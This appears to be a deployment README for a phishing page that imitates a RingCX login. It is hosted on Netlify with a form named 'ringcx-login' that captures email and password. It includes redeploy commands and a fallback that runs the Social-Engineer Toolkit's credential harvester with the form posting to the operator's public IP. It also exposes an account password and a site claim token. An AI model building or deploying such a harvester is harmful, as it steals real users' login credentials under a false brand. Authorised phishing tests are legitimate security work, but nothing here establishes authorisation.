# Netlify deployment for RingCX test login

## Live site (anonymous deploy — claim within 60 min)

| Field | Value |
|-------|-------|
| **URL** | https://thriving-cupcake-563909.netlify.app |
| **Site password** | `My-Drop-Site` |
| **Netlify account** | `javapo1337@gmail.com` / `RingCX-Test2026!` (pending email verification) |

### Claim the site to your account

1. Verify email at `javapo1337@gmail.com` (check inbox for Netlify verification link).
2. Log in at https://app.netlify.com/
3. Open the claim link:
   ```
   https://app.netlify.com/drop/thriving-cupcake-563909#drop_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3ODgwOTIyNzUsImV4cCI6MTc4ODA5NTg3NSwiaXNzIjoiTmV0bGlmeSIsInNlc3Npb25faWQiOiIyY2VlNTU5MC0wZWRiLTRjMTItYTc3ZC0zZDVhMGYxNmVkMWQifQ.kbJXLXAMpYKadwo20FEDLeh--Cw0-7XNtdh7IrCdeqc
   ```
4. Accept org invite: https://app.netlify.com/invites/fabdbbacf74dd4751fbb
5. Remove site password: **Site configuration → Access control → Password protection → Off**

### Credential harvester on Netlify

SET cannot run on Netlify (static hosting only). Instead, **Netlify Forms** captures submissions:

- Form name: `ringcx-login`
- Fields: `email`, `password`
- View submissions: **Netlify dashboard → Site → Forms**

After claiming the site, submit a test login and confirm it appears under Forms.

### Redeploy after changes

```bash
cd set-phishing/ringcx-login
npx netlify deploy --dir=. --prod --no-build
```

With a logged-in account:

```bash
npx netlify login
npx netlify deploy --dir=. --prod --no-build --site thriving-cupcake-563909
```

### Local SET harvester (fallback)

If you prefer SET over Netlify Forms, run locally:

```bash
sudo setoolkit
# Social-Engineering Attacks → Website Attack Vectors → Credential Harvester
# → Import your own site → /workspace/set-phishing/ringcx-login/
```

Harvested credentials: `~/.set/reports/` (or `/root/.set/reports/` with sudo).

**Note:** For SET, change the form `action` back to your machine's public IP instead of `/thanks.html`.
